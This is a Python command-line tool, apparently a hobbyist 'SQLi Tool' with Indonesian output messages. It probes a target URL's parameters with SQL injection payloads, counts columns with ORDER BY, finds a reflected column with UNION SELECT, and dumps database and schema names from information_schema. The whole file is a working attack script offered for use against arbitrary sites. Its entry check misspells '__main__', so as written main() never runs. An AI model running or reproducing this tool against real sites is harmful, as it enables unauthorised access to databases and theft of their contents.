import time
import sys

banner = r"""
 ███████╗ ██████╗ █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
██╔════╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
███████╗██║     ███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██████╔╝
╚════██║██║     ██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██╔══██╗
███████║╚██████╗██║  ██║██║ ╚████║██║ ╚████║███████╗██║  ██║
╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝   
v1.0 by ReXploit505 | SCANNER - SQLi Tool
"""
print(banner)
time.sleep(0.5)

#requirment.txt

import requests
import argparse
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

HEADERS = {"User-Agent": "Mozilla/5.0"}

def make_request(url):
    try:
        return requests.get(url, headers=HEADERS, timeout=5)
    except Exception as e:
        print(f"[!] Error: {e}")
        return None

def inject_param(url, param, payload):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    if param not in query:
        return None
    original = query[param][0]
    query[param][0] = original + payload
    new_query = urlencode(query, doseq=True)
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))

def detect_sqli(url):
    print("\n[+] Mendeteksi SQL Injection...")
    payloads = ["'--", "' OR '1'='1", "' AND 1=1 --", "' AND 1=2 --"]
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    for param in params:
        for payload in payloads:
            test_url = inject_param(url, param, payload)
            r = make_request(test_url)
            if r and any(e in r.text.lower() for e in ["mysql", "syntax", "error", "warning"]):
                print(f"[✓] SQLi terdeteksi pada param: '{param}' dengan payload: {payload}")
                return param
    print("[-] Tidak ditemukan SQLi.")
    return None

def check_columns(url, param):
    print("\n[+] Mendeteksi jumlah kolom...")
    for i in range(1, 11):
        payload = f"' ORDER BY {i} --"
        test_url = inject_param(url, param, payload)
        r = make_request(test_url)
        if not r or "error" in r.text.lower():
            print(f"[✓] Jumlah kolom: {i - 1}")
            return i - 1
    print("[-] Gagal menentukan jumlah kolom.")
    return None

def find_reflected_column(url, param, total_columns):
    print("\n[+] Mencari kolom yang tampil...")
    for i in range(total_columns):
        cols = ["null"] * total_columns
        cols[i] = "'R3F'"
        payload = f"' UNION SELECT {','.join(cols)} --"
        test_url = inject_param(url, param, payload)
        r = make_request(test_url)
        if r and "R3F" in r.text:
            print(f"[✓] Kolom ke-{i+1} muncul di halaman.")
            return i + 1
    print("[-] Tidak ada kolom yang tampil.")
    return None

def dump_database_name(url, param, col_count, visible_col):
    print("\n[+] Dump nama database...")
    cols = ["null"] * col_count
    cols[visible_col - 1] = "database()"
    payload = f"' UNION SELECT {','.join(cols)} --"
    test_url = inject_param(url, param, payload)
    r = make_request(test_url)
    if r:
        print(f"[✓] Hasil dump: {test_url}")
        with open("results.txt", "a") as f:
            f.write(f"Database name dump:\n{test_url}\n\n")

def dump_all_databases(url, param, col_count, visible_col):
    print("\n[+] Dump semua nama database...")
    cols = ["null"] * col_count
    cols[visible_col - 1] = "group_concat(schema_name)"
    payload = "' UNION SELECT " + ",".join(cols) + " FROM information_schema.schemata --"
    test_url = inject_param(url, param, payload)
    r = make_request(test_url)
    if r:
        print(f"[✓] Semua database (via schema_name): {test_url}")
        with open("results.txt", "a") as f:
            f.write(f"All DBs dump:\n{test_url}\n\n")

def main():
    parser = argparse.ArgumentParser(description="Scanner.py - CLI SQLi Scanner & Dumper")
    parser.add_argument("-u", "--url", required=True, help="Target URL (e.g., http://site.com/page.php?id=1)")
    parser.add_argument("--check", action="store_true", help="Check SQLi vulnerability")
    parser.add_argument("--columns", action="store_true", help="Check jumlah kolom")
    parser.add_argument("--visible", action="store_true", help="Check kolom yang tampil")
    parser.add_argument("--dump-db", action="store_true", help="Dump database")
    parser.add_argument("--dump-all", action="store_true", help="Dump all database")
    args = parser.parse_args()
    url = args.url.strip()

    param = detect_sqli(url) if args.check or args.columns or args.visible or args.dump_db or args.dump_all else None
    if not param:
        param = detect_sqli(url)
    if not param:
        return

    col_count = check_columns(url, param) if args.columns or args.visible or args.dump_db or args.dump_all else None
    if not col_count:
        col_count = check_columns(url, param)
    if not col_count:
        return

    visible_col = find_reflected_column(url, param, col_count) if args.visible or args.dump_db or args.dump_all else None
    if not visible_col:
        visible_col = find_reflected_column(url, param, col_count)
    if not visible_col:
        return

    if args.dump_db:
        dump_database_name(url, param, col_count, visible_col)

    if args.dump_all:
        dump_all_databases(url, param, col_count, visible_col)

    print("\n[✓] Selesai. Hasil dump tersimpan di 'results.txt'")

if __name__ == "_main_":
    main()